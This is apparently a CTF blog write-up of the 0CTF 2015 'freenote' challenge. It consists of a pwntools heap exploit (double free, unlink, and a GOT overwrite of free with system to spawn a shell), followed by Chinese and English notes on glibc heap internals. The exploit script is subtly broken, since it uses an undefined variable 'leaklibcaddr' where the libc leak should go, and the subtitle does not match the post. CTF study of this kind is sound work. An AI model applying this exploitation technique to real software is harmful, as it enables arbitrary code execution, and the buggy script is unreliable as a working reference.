---
layout: post
title: Freenote writeup -- Understand heap and double free
subtitle: The Next Generation Application Model For The Web - Progressive Web App
date: {}
author: Dafeng
header-img: img/post-bg-nextgen-web-pwa.jpg
header-mask: 0.3
catalog: true
tags:
  - CTF
  - Heap
  - Exploit
published: true
---

## Exploit

```python

#!/usr/bin/env python
from pwn import *

context(arch = 'x86_64', os = 'linux', endian='little')
context.log_level = 'debug'
#elf = ELF('./freenote_x64')
p = process('./freenote_x64')
#p = remote('127.0.0.1',10001)
print proc.pidof(p)
raw_input('gdb attach')

def new_note(x):
    p.recvuntil("Your choice: ")
    p.send("2\n")
    p.recvuntil("Length of new note: ")
    p.send(str(len(x))+"\n")
    p.recvuntil("Enter your note: ")
    p.send(x)

def delete_note(x):
    p.recvuntil("Your choice: ")
    p.send("4\n")
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")

def list_note():
    p.recvuntil("Your choice: ")
    p.send("1\n")

def edit_note(x,y):
    p.recvuntil("Your choice: ")
    p.send("3\n")   
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")   
    p.recvuntil("Length of note: ")
    p.send(str(len(y))+"\n")   
    p.recvuntil("Enter your note: ")
    p.send(y)

####################leak libc#########################

if __name__ == '__main__':
    notelen = 0x80
    new_note('a' * notelen)
    new_note('b' * notelen)
    delete_note(0)
    new_note('cccccccc')
    list_note()
    p.recvuntil('0. ')
    leak = p.recvuntil('\n')
    #log.info('heap:' + str(u64(leak[8:-1])))
    print leak[0:-1].encode('hex')

    delete_note(1)
    delete_note(0)

    #libc_base = leaklibcaddr - offset          (此处偏移依据libc版本不同，基址页对齐4K,也就是地址后三位为000，如：0x7fabba34b000)
    #进而再算出system, "/bin/sh" 偏移  或者将"/bin/sh\x00" 写入到heap or bss
    system_sh_addr = leaklibcaddr - 0x3724a8   
    print "system_sh_addr: " + hex(system_sh_addr)
    binsh_addr = leaklibcaddr - 0x23e7f1
    print "binsh_addr: " + hex(binsh_addr)

    #raw_input()

    ####################leak heap#########################

    notelen=0x10

    new_note("A"*notelen)
    new_note("B"*notelen)
    new_note("C"*notelen)
    new_note("D"*notelen)
    delete_note(2)
    delete_note(0)

    new_note("AAAAAAAA")
    list_note()
    p.recvuntil("0. AAAAAAAA")
    leak = p.recvuntil("\n")

    print leak[0:-1].encode('hex')
    leakheapaddr = u64(leak[0:-1].ljust(8, '\x00'))
    print hex(leakheapaddr)

    delete_note(0)
    delete_note(1)
    delete_note(3)

    ####################unlink exp#########################

    notelen = 0x80

    #new_note("/bin/sh\x00"+"A"*(notelen-8))
    new_note("A"*notelen)
    new_note("B"*notelen)
    new_note("C"*notelen)

    delete_note(2)
    delete_note(1)
    delete_note(0)

    fd = leakheapaddr - 0x1808 #notetable
    bk = fd + 0x8


    payload  = ""
    payload += p64(0x0) + p64(notelen+1) + p64(fd) + p64(bk) + "A" * (notelen - 0x20)
    payload += p64(notelen) + p64(notelen+0x10) + "A" * notelen
    payload += p64(0) + p64(notelen+0x11)+ "\x00" * (notelen-0x20)

    new_note(payload)

    delete_note(1)

    free_got = 0x602018

    payload2 = p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + "A"*16 + p64(binsh_addr)
    payload2 += "A"* (notelen*3-len(payload2)) 

    edit_note(0, payload2)
    edit_note(0, p64(system_sh_addr))

    delete_note(1)

    p.interactive()
        
```

## 泄露libc基址的方法:
- 运行脚本程序  python -m pdb myexp.py   (过程中会打印出进程号xxx)
- gdb attach  xxx
    - vmmap 查看内存分布
    - p main_arena
    - p main_arena.bins[0]
    - p &main_arena.bins[0]
- 通过泄露unsort_bin 地址，我们来计算libc函数基址以及system 函数地址

### leaking a heap address is fairly simple though:
1. Allocate 4 chunks.
2. Free chunk 3 and chunk 1 (in that order, so that malloc writes the two pointers into chunk 1).
3. Allocate another chunk of size 1 (or 8). This chunk will be placed where chunk 1 used to be and 
   where its FD and BK pointers still are, with the BK pointer pointing to chunk 3.
4. Print the notes, since this is a %s print, we can leak the FD (or BK if chosen size in step 3 was 8)
   pointer of chunk 1 which in our case points to chunk 3 (heap memory).
   
> This same technique can be used to leak a libc address (the head of the freelist is in the .bss of the libc). Simply follow the same steps, but now it suffices to allocate chunks 1 and 2 and free the first. 


### 对漏洞利用步骤：
我们通过新建两个note,然后free(0),再new_note("aaaaaaaa"),在new_note时unsorted_bin 双向链表中只有free的note0,当再次申请堆内存时，就会重新获取trunk0, "aaaaaaaa"就会覆盖trunk0的fd，list_note()就会泄露trunk0的bk，而bk指向的是main_arena中的unsort_bin 首地址(就是p &main_arena.bins[0]地址减去0x10)， 可以算出libc_base的地址，从而确定libc中函数的地址。 

1. unsorted_bin 双向链表采用的是头部插入的方式，header(unsorted_bin) fd 指向最新插入元素的地址，并且采用FIFO的方式，那么泄露的第一个插入进
   unsorted_bin的trunk的fd，fd就是unsorted_bin的首地址，从而可以算出libc_base. 如果泄露bk，bk就是第二个插入到unsorted_bin的首地址，利用此方法
   可以泄露出heap的地址，进而计算出heap_base
2. 如何我们要unlink的trunk的首地址指针为P，那么我们需要找到一个指针X(满足条件*X = P), 我们需要在note table(形式结构体如下：)

 ```c
 Struct note{
    int flag;
    int length;
    char* content;
  }note;
 fd = X - 0x18
 bk = X - 0x10
```

以64bit为例,假设找到了一个已知地址的ptr是指向p(p指向堆上的某个地方)的，通过堆溢出，我们可以做如下的修改:
- p->fd=ptr-0x18
- p->bk=ptr-0x10

布置好如此结构后，再触发unlink宏，会发生如下情况:

1. FD=p->fd(实际是ptr-0x18)
2. BK=p->bk(实际是ptr-0x10)
3. 检查是否满足上文所示的限制，由于FD->bk和BK->fd均为*ptr(即p)，由此可以过掉这个限制
4. FD->bk=BK
5. BK->fd=FD(p=ptr-0x18)
  
> 执行unlink后, P -> X - 0x18 （P的值变成X - 0x18） X指向的地址做任意写操作,就能通过再次覆盖修改X的值,继而使X指向我们想修改的任意空间,从而实现对任意地址的任意修改.

### 合并方式
- 前向合并:
    -如果检查当前块P的pre_inuse位为0,就把前一块P0从freelist中取出来,这个过程会对P0执行unlink操作.
- 后向合并(后一块P1非TOPchunk):
    -通过 块P地址+size 获取块P的后一块P1,再通过P1的后一块P2的pre_inuse位来判断块P1的状态,如果是0,代表P1是free的,对P执行unlink操作最后,把前面free出来的合并块(A+B)放到unsorted chunk里,如果P1是TOPchunk,就直接合并到TOPchunk.

### realloc 关键
在执行该语句：edit_note(0, payload2)， 程序会调用realloc函数（void * realloc ( void * ptr, size_t new_size );），因为传入的地址为X - 0x18, 根据realloc行为，我们希望修改X-0x18地址处的数据，那么必须使realloc函数执行后，返回的ptr指针不变，此时令realloc前后的长度保持一致，即newsize = oldsize。因此在该题中会覆盖X-0x18的内容。
realloc的行为方式，结合源码总结为：

1. realloc失败的时候，返回NULL；
2. realloc失败的时候，原来的内存不改变，也就是不free或不move，(这个地方很容易出错)；
3. 假如原来的内存后面还有足够多剩余内存的话，realloc的内存=原来的内存+剩余内存,realloc还是返回原来内存的地址; 
   假如原来的内存后面没有足够多剩余内存的话，realloc将申请新的内存，然后把原来的内存数据拷贝到新内存里，原来的内存将被free掉,
   realloc返回新内存的地址；
4. 如果size为0，效果等同于free()；
5. 传递给realloc的指针可以为空，等同于malloc；
6. 传递给realloc的指针必须是先前通过malloc(), calloc(), 或realloc()分配的。


### 思路总结
通过泄露的libc地址我们可以计算出 system() 函数和 "/bin/sh" 字符串在内存中的地址，通过泄露的堆的地址我们能得到note table的地址。然后我们构造一个假的note，利用使用double free的漏洞触发unlink，将note0的位置指向note table的地址。随后我们就可以通过编辑note0来编辑note table了。通过编辑note table我们把note0指向 free() 函数在got表中的地址，把note1指向 "/bin/sh" 在内存中的地址。然后我们编辑note0把 free() 函数在got表中的地址改为 system() 的地址。最后我们执行delete note1操作。因为我们把note1的地址指向了 "/bin/sh" ，所以正常情况下程序会执行 free("/bin/sh") ，但别忘了我们修改了got表中free的地址，所以程序会执行 system("/bin/sh")。

#####参考链接
* https://kitctf.de/writeups/0ctf2015/freenote 
* http://rk700.github.io/2015/04/21/0ctf-freenote/
* http://www.tuicool.com/articles/IfYZri3
* http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up